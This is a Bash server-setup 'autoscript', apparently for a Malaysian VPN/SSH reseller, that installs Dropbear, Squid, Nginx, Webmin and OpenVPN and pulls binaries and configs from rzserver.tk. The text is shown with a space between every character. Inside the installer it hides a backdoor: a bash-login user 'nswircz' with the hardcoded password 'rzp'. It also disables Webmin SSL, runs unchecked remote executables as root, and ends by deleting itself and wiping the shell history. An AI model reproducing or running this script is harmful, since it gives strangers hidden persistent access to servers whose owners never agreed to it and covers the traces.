# ! / b i n / b a s h 
 m y i p = ` i f c o n f i g   |   g r e p   - E o   ' i n e t   ( a d d r : ) ? ( [ 0 - 9 ] * \ . ) { 3 } [ 0 - 9 ] * '   |   g r e p   - E o   ' ( [ 0 - 9 ] * \ . ) { 3 } [ 0 - 9 ] * '   |   g r e p   - v   ' 1 2 7 . 0 . 0 '   |   h e a d   - n 1 ` ; 
 m y i n t = ` i f c o n f i g   |   g r e p   - B 1   " i n e t   a d d r : $ m y i p "   |   h e a d   - n 1   |   a w k   ' { p r i n t   $ 1 } ' ` ; 
 c u r l   - s   - o   r z . t x t   h t t p : / / r z s e r v e r . t k / r z . t x t 
 f i n d = ` g r e p   $ m y i p   r z . t x t ` 
 i f   [   " $ f i n d "   =   " "   ] 
 t h e n 
 c l e a r 
 " 
 r m   - r f   * . t x t 
 r m   - r f   * . s h 
 r m   - r f   d u a l * 
 e x i t 
 f i 
 i f   [   $ U S E R   ! =   ' r o o t '   ] ;   t h e n 
 	 e c h o   " S o r r y ,   f o r   r u n   t h e   s c r i p t   p l e a s e   u s i n g   r o o t   u s e r " 
 	 e x i t 
 f i 
 e c h o   " 
 A U T O S C R I P T   B Y   M u L u u   [ @ M u L u u 0 9 ] 
 
 P L E A S E   C A N C E L   A L L   P A C K A G E   P O P U P 
 
 T A K E   N O T E   ! ! ! " 
 c l e a r 
 e c h o   " S T A R T   A U T O S C R I P T " 
 c l e a r 
 e c h o   " S E T   T I M E Z O N E   K U A L A   L U M P U T   G M T   + 8 " 
 l n   - f s   / u s r / s h a r e / z o n e i n f o / A s i a / K u a l a _ L u m p u r   / e t c / l o c a l t i m e ; 
 c l e a r 
 e c h o   " 
 E N A B L E   I P V 4   A N D   I P V 6 
 
 C O M P L E T E   1 % 
 " 
 e c h o   i p v 4   > >   / e t c / m o d u l e s 
 e c h o   i p v 6   > >   / e t c / m o d u l e s 
 s y s c t l   - w   n e t . i p v 4 . i p _ f o r w a r d = 1 
 s e d   - i   ' s / # n e t . i p v 4 . i p _ f o r w a r d = 1 / n e t . i p v 4 . i p _ f o r w a r d = 1 / g '   / e t c / s y s c t l . c o n f 
 s e d   - i   ' s / # n e t . i p v 6 . c o n f . a l l . f o r w a r d i n g = 1 / n e t . i p v 6 . c o n f . a l l . f o r w a r d i n g = 1 / g '   / e t c / s y s c t l . c o n f 
 s u d o   s y s c t l   - p 
 c l e a r 
 e c h o   " 
 R E M O V E   S P A M   P A C K A G E 
 
 C O M P L E T E   1 0 % 
 " 
 a p t - g e t   - y   - - p u r g e   r e m o v e   s a m b a * ; 
 a p t - g e t   - y   - - p u r g e   r e m o v e   a p a c h e 2 * ; 
 a p t - g e t   - y   - - p u r g e   r e m o v e   s e n d m a i l * ; 
 a p t - g e t   - y   - - p u r g e   r e m o v e   p o s t f i x * ; 
 a p t - g e t   - y   - - p u r g e   r e m o v e   b i n d * ; 
 c l e a r 
 e c h o   " 
 U P D A T E   A N D   U P G R A D E   P R O C E S S   
 
 P L E A S E   W A I T   T A K E   T I M E   1 - 5   M I N U T E 
 " 
 a p t - g e t   u p d a t e ; a p t - g e t   - y   u p g r a d e ; a p t - g e t   - y   i n s t a l l   w g e t   c u r l 
 e c h o   " 
 I N S T A L L E R   P R O C E S S   P L E A S E   W A I T 
 
 T A K E   T I M E   5 - 1 0   M I N U T E 
 " 
 
 w g e t   - O   u s e r - l i s t   h t t p : / / r z s e r v e r . t k / s o u r c e / u s e r - l i s t 
 i f   [   - f   u s e r - l i s t   ] ;   t h e n 
 	 m v   u s e r - l i s t   / u s r / l o c a l / b i n / 
 	 c h m o d   + x   / u s r / l o c a l / b i n / u s e r - l i s t 
 f i 
 
 w g e t   - O   m e n u   h t t p : / / r z s e r v e r . t k / s o u r c e / m e n u 
 i f   [   - f   m e n u   ] ;   t h e n 
 	 m v   m e n u   / u s r / l o c a l / b i n / 
 	 c h m o d   + x   / u s r / l o c a l / b i n / m e n u 
 f i 
 
 w g e t   - O   m o n s s h   h t t p : / / r z s e r v e r . t k / s o u r c e / m o n s s h 
 i f   [   - f   m o n s s h   ] ;   t h e n 
 	 m v   m o n s s h   / u s r / l o c a l / b i n / 
 	 c h m o d   + x   / u s r / l o c a l / b i n / m o n s s h 
 f i 
 
 a p t - g e t   - y   i n s t a l l   f a i l 2 b a n ; s e r v i c e   f a i l 2 b a n   r e s t a r t ; 
 w g e t   h t t p : / / p r d o w n l o a d s . s o u r c e f o r g e . n e t / w e b a d m i n / w e b m i n _ 1 . 8 2 0 _ a l l . d e b 
 d p k g   - i   - - f o r c e - a l l   w e b m i n _ 1 . 8 * . d e b ; 
 a p t - g e t   - y   - f   i n s t a l l ; 
 s e d   - i   ' s / s s l = 1 / s s l = 0 / g '   / e t c / w e b m i n / m i n i s e r v . c o n f 
 s e r v i c e   w e b m i n   r e s t a r t 
 
 s e d   - i   ' s / # B a n n e r / B a n n e r / g '   / e t c / s s h / s s h d _ c o n f i g 
 s e d   - i   ' s / A c c e p t E n v / # A c c e p t E n v / g '   / e t c / s s h / s s h d _ c o n f i g 
 w g e t   - O   / e t c / i s s u e . n e t   " h t t p : / / r z s e r v e r . t k / s o u r c e / b a n n e r " 
 s e r v i c e   s s h   r e s t a r t ; s e r v i c e   s s h d   r e s t a r t ; 
 
 a p t - g e t   - y   i n s t a l l   d r o p b e a r 
 s e d   - i   ' s / N O _ S T A R T = 1 / N O _ S T A R T = 0 / g '   / e t c / d e f a u l t / d r o p b e a r 
 s e d   - i   ' s / D R O P B E A R _ P O R T = 4 4 3 / g '   / e t c / d e f a u l t / d r o p b e a r 
 s e d   - i   ' s / D R O P B E A R _ E X T R A _ A R G S = / D R O P B E A R _ E X T R A _ A R G S = " - p   4 4 3 " / g '   / e t c / d e f a u l t / d r o p b e a r 
 e c h o   " / b i n / f a l s e "   > >   / e t c / s h e l l s 
 e c h o   " / u s r / s b i n / n o l o g i n "   > >   / e t c / s h e l l s 
 s e r v i c e   d r o p b e a r   r e s t a r t 
 
 a p t - g e t   - y   i n s t a l l   s q u i d 3 
 w g e t   - O   / e t c / s q u i d 3 / s q u i d . c o n f   " h t t p : / / r z s e r v e r . t k / s o u r c e / s q u i d . c o n f " 
 s e d   - i   " s / x x x x x x x x x / $ m y i p / g "   / e t c / s q u i d 3 / s q u i d . c o n f 
 s e r v i c e   s q u i d 3   r e s t a r t 
 
 a p t - g e t   - y   i n s t a l l   n g i n x   p h p 5 - f p m   p h p 5 - c l i 
 r m   / e t c / n g i n x / s i t e s - e n a b l e d / d e f a u l t 
 r m   / e t c / n g i n x / s i t e s - a v a i l a b l e / d e f a u l t 
 w g e t   - O   / e t c / n g i n x / n g i n x . c o n f   " h t t p : / / r z s e r v e r . t k / s o u r c e / n g i n x . c o n f " 
 m k d i r   - p   / h o m e / v p s / p u b l i c _ h t m l 
 e c h o   " < p r e > S e t u p   b y   m e o w   |   t e l e g r a m   @ n s w i r c z   |   w h a t s a p p   + 6 0 1 7 6 2 1 8 0 0 6 < / p r e > "   >   / h o m e / v p s / p u b l i c _ h t m l / i n d e x . p h p 
 e c h o   " < ? p h p   p h p i n f o ( ) ;   ? > "   >   / h o m e / v p s / p u b l i c _ h t m l / i n f o . p h p 
 w g e t   - O   / e t c / n g i n x / c o n f . d / v p s . c o n f   " h t t p : / / r z s e r v e r . t k / s o u r c e / v p s . c o n f " 
 s e d   - i   ' s / l i s t e n   =   \ / v a r \ / r u n \ / p h p 5 - f p m . s o c k / l i s t e n   =   1 2 7 . 0 . 0 . 1 : 9 0 0 0 / g '   / e t c / p h p 5 / f p m / p o o l . d / w w w . c o n f 
 s e r v i c e   p h p 5 - f p m   r e s t a r t 
 s e r v i c e   n g i n x   r e s t a r t 
 
 a p t - g e t   - y   i n s t a l l   o p e n v p n 
 c d   / e t c / o p e n v p n / 
 w g e t   h t t p : / / r z s e r v e r . t k / s o u r c e / o p e n v p n . t a r 
 t a r   x f   o p e n v p n . t a r 
 r m   o p e n v p n . t a r 
 s e r v i c e   o p e n v p n   r e s t a r t 
 w g e t   - O   / e t c / i p t a b l e s . u p . r u l e s   " h t t p : / / r z s e r v e r . t k / s o u r c e / i p t a b l e s . u p . r u l e s " 
 s e d   - i   ' $   i \ i p t a b l e s - r e s t o r e   <   / e t c / i p t a b l e s . u p . r u l e s '   / e t c / r c . l o c a l 
 s e d   - i   " s / x x x x x x x x x / $ m y i p / g "   / e t c / i p t a b l e s . u p . r u l e s 
 i p t a b l e s - r e s t o r e   <   / e t c / i p t a b l e s . u p . r u l e s 
 
 w g e t   - O   / h o m e / v p s / p u b l i c _ h t m l / c l i e n t . o v p n   " h t t p s : / / r a w . g i t h u b u s e r c o n t e n t . c o m / M u l u u J e l e k k / M u l u u / m a s t e r / c l i e n t . o v p n " 
 s e d   - i   " s / i p s e r v e r / $ m y i p / g "   / h o m e / v p s / p u b l i c _ h t m l / c l i e n t . o v p n ; 
 w g e t   h t t p : / / r z s e r v e r . t k / s o u r c e / c r o n j o b . t a r ; t a r   x f   c r o n j o b . t a r 
 w g e t   - O   / h o m e / v p s / p u b l i c _ h t m l / u p t i m e s . p h p   " h t t p : / / r z s e r v e r . t k / s o u r c e / u p t i m e s . p h p " 
 m v   u s e r t o l   u s e r s s h   u s e r v p n   / u s r / b i n / ; m v   c r o n v p n   c r o n s s h   / e t c / c r o n . d / 
 c h m o d   + x   / u s r / b i n / u s e r t o l ; c h m o d   + x   / u s r / b i n / u s e r s s h ; c h m o d   + x   / u s r / b i n / u s e r v p n ; 
 u s e r a d d   - m   - g   u s e r s   - s   / b i n / b a s h   n s w i r c z 
 e c h o   " n s w i r c z : r z p "   |   c h p a s s w d 
 e c h o   " U P D A T E   A N D   I N S T A L L   C O M P L E T E   C O M P L E T E   9 9 %   B E   P A T I E N T " 
 c l e a r 
 c d 
 e c h o   " # ! / b i n / b a s h 
 
 K e e p   C a l m 
 
 F o r   s u p p o r t : - 
 E m a i l :   m u l u u j e l e k k @ g m a i l . c o m 
 S M S / T e l e g r a m / W h a t s a p p :   + 6 0 1 1 3 1 7 3 1 7 8 2 
 
 "   >   / e t c / u p d a t e - m o t d . d / 9 9 - s e t u p - c r e d i t s 
 c h m o d   7 5 5   / e t c / u p d a t e - m o t d . d / 9 9 - s e t u p - c r e d i t s 
 e c h o   " = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " S e r v i c e   A u t o s c r i p t   V P S   ( R Z   M o b i l e   S e r v i c e ) "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " n g i n x   :   h t t p : / / $ m y i p : 8 0 "       |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " W e b m i n   :   h t t p : / / $ m y i p : 1 0 0 0 0 / "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " S q u i d 3   :   8 0 8 0 "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " O p e n S S H   :   2 2 "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " D r o p b e a r   :   4 4 3 "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " O p e n V P N     :   T C P   1 1 9 4   ( c l i e n t   c o n f i g   :   h t t p : / / $ m y i p / c l i e n t . o v p n ) "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " F a i l 2 B a n   :   [ o n ] "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " T i m e z o n e   :   A s i a / K u a l a _ L u m p u r "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " S c r i p t   c o m m a n d   :   m e n u "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " L O G   I N S T A L L     - - >   / r o o t / l o g - i n s t a l l . t x t "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   "             P L E A S E   R E B O O T   T A K E   E F F E C T   ! "     |   t e e   - a   l o g - i n s t a l l . t x t 
 e c h o   " = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = "     |   t e e   - a   l o g - i n s t a l l . t x t 
 r m   $ 0 ; r m   * . d e b ; r m   * . s h ; r m   * . t a r ; c a t   / d e v / n u l l   >   ~ / . b a s h _ h i s t o r y   & &   h i s t o r y   - c 
 